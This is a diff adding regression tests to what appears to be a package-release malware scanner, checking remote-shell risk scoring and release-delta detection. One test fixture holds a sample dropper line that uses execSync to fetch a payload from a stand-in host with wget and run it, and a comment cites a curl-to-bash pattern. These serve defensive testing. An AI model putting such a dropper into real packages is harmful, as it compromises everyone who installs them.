@@ -2193,6 +2193,24 @@ describe("computeRisk weighted multi-signal roll-up (issue #193)", () => {
     ).toBe("high");
   });
 
+  test("a lone remote-shell capability is not de-escalated", () => {
+    // `code.remote-shell` used to live inside `code.process-execution`, so
+    // `execSync('curl … | bash')` scored as one weak capability and the release
+    // rolled up to low — the gate then recommended approve. Shelling out to a
+    // compiler and shelling out to the network are not the same evidence.
+    expect(computeRisk([code("code.remote-shell", "high")])).toBe("high");
+    expect(computeRisk([code("code.remote-shell", "critical")])).toBe("critical");
+  });
+
+  test("co-occurrence is a floor, not a ceiling", () => {
+    // The co-occurrence branch used to return a flat "high", which meant adding a
+    // second capability could *lower* a critical one. Escalation must never
+    // de-escalate.
+    expect(
+      computeRisk([code("code.remote-shell", "critical"), code("code.process-execution", "high")]),
+    ).toBe("critical");
+  });
+
   test("an obfuscated lone capability is not de-escalated", () => {
     // Assembling `child_process` from string fragments is itself a malice signal,
     // so a lone obfuscated process-execution keeps its severity.
@@ -2538,5 +2556,68 @@ describe("baseline finding fingerprints", () => {
       { previousFiles: previous, stagedFiles: staged },
     );
     expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
+  });
+});
+
+describe("code.remote-shell release-delta classification", () => {
+  const manifest = { name: "p", version: "1.0.1", main: "index.js" };
+
+  test("a decoy shell token in an untouched line does not hide the added dropper", () => {
+    // Regression: `patternsForFinding` had no case for `code.remote-shell`, so
+    // the rule could only be release-delta when its recorded line happened to
+    // be a changed line — and the recorded line is the *first* match in the
+    // file. Any pre-existing `curl`/`wget`/`nc` token earlier in the file (a
+    // comment, a usage string) pinned it to an unchanged line and dropped the
+    // newly added dropper out of `releaseRisk`, which is what the workflow gate
+    // reads. The gate then recommended approve.
+    const previousFiles = [
+      {
+        path: "package.json",
+        size: 40,
+        sha256: "a",
+        flags: [],
+        textSample: JSON.stringify({ name: "p", version: "1.0.0", main: "index.js" }),
+      },
+      {
+        path: "index.js",
+        size: 60,
+        sha256: "b",
+        flags: [],
+        textSample: "// see: curl https://example.invalid/docs\nconst a = 1;\n",
+      },
+    ];
+    const stagedFiles = [
+      {
+        path: "package.json",
+        size: 40,
+        sha256: "c",
+        flags: [],
+        textSample: JSON.stringify(manifest),
+      },
+      {
+        path: "index.js",
+        size: 160,
+        sha256: "d",
+        flags: [],
+        textSample:
+          "// see: curl https://example.invalid/docs\nconst a = 1;\n" +
+          'require("child_process").execSync("wget http://evil.invalid/p -O /tmp/p && /tmp/p");\n',
+      },
+    ];
+
+    const diff = createPackageDiff(previousFiles, stagedFiles);
+    const annotated = annotateFindingsWithDiffStatus(
+      deterministicFindings(stagedFiles, diff, manifest),
+      diff,
+      { previousFiles, stagedFiles },
+    );
+
+    const remoteShell = annotated.find((finding) => finding.ruleId === "code.remote-shell");
+    expect(remoteShell).toBeDefined();
+    // The recorded line is still the decoy on line 1 — that is where the first
+    // pattern match is — but the finding is release delta because the rule's
+    // patterns also match the added line.
+    expect(remoteShell.releaseDelta).toBe(true);
+    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
   });
 });
